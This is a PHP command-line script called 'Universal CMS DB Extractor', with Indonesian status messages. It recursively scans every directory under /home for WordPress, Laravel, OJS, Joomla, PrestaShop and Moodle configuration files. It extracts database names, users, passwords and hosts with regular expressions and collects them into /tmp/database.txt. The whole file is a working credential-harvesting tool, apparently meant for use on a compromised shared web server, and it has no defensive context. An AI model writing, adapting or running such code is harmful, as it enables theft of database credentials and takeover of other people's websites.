#!/usr/bin/php
<?php
// Universal CMS DB Extractor - PHP Version

$baseDir = "/home";
$outputFile = "/tmp/database.txt";
file_put_contents($outputFile, "");

echo "[*] Scanning CMS config files di: $baseDir ...\n";

$pattern = '/(' . implode('|', [
    'wp-config\.php',
    '\.env',
    'config\.inc\.php',
    'configuration\.php',
    'config\.php',
    'parameters\.php',
    'settings\.inc\.php',
    'env\.php',
    'local\.xml'
]) . ')$/';

$iterator = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS)
);

foreach ($iterator as $file) {
    if ($file->isFile() && preg_match($pattern, $file->getFilename())) {
        $filePath = $file->getPathname();
        $filename = $file->getFilename();
        $content = file_get_contents($filePath);
        
        $cms = "Unknown";
        $dbName = $dbUser = $dbPass = $dbHost = $dbPrefix = "";
        
        switch ($filename) {
            case "wp-config.php":
                $cms = "WordPress";
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case ".env":
                $cms = "Laravel";
                if (preg_match("/^DB_DATABASE=(.*)$/m", $content, $match)) $dbName = trim($match[1]);
                if (preg_match("/^DB_USERNAME=(.*)$/m", $content, $match)) $dbUser = trim($match[1]);
                if (preg_match("/^DB_PASSWORD=(.*)$/m", $content, $match)) $dbPass = trim($match[1]);
                if (preg_match("/^DB_HOST=(.*)$/m", $content, $match)) $dbHost = trim($match[1]);
                break;
                
            case "config.inc.php":
                $cms = "OJS";
                if (preg_match("/db_name\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/db_username\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/db_password\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/db_host\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                break;
                
            case "configuration.php":
                $cms = "Joomla";
                if (preg_match("/public\s+\$db\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/public\s+\$user\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/public\s+\$password\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/public\s+\$host\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/public\s+\$dbprefix\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case "parameters.php":
            case "settings.inc.php":
                $cms = "PrestaShop";
                if (preg_match("/define\s*\(\s*['\"]_DB_NAME_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_USER_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_PASSWD_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_SERVER_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_PREFIX_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case "config.php":
                if (preg_match("/moodle/i", $content) && preg_match("/dbuser/i", $content)) {
                    $cms = "Moodle";
                    if (preg_match("/\\\$CFG->dbname\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                    if (preg_match("/\\\$CFG->dbuser\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                    if (preg_match("/\\\$CFG->dbpass\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                    if (preg_match("/\\\$CFG->dbhost\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                }
                break;
        }
        
        if (!empty($dbName) && !empty($dbUser)) {
            $output = "[CMS: $cms]\n";
            $output .= "Path       : $filePath\n";
            $output .= "DB_NAME    : $dbName\n";
            $output .= "DB_USER    : $dbUser\n";
            $output .= "DB_PASSWORD: $dbPass\n";
            $output .= "DB_HOST    : $dbHost\n";
            if (!empty($dbPrefix)) $output .= "DB_PREFIX  : $dbPrefix\n";
            $output .= "\n";
            
            file_put_contents($outputFile, $output, FILE_APPEND);
        }
    }
}

echo "\n[+] Selesai. Hasil valid disimpan di file: $outputFile\n";
?>
